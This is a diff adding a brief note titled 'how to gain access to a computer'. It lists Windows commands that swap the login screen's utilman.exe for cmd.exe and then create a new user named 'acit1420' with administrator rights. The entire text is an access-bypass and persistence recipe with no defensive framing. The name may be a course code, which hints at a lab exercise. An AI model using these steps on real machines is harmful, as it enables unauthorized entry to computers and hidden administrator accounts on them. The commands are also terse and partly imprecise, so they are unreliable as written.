@@ -1,0 +1,9 @@
+how to gain access to a computer
+
+Copy c:\windows\system32\utilman.exe c:\
+Copy c:\windows\system32\cmd.exe utilman.exe
+
+Create an account
+Net user acit1420 /add
+Net localgroup administrators acit1420 /add
+
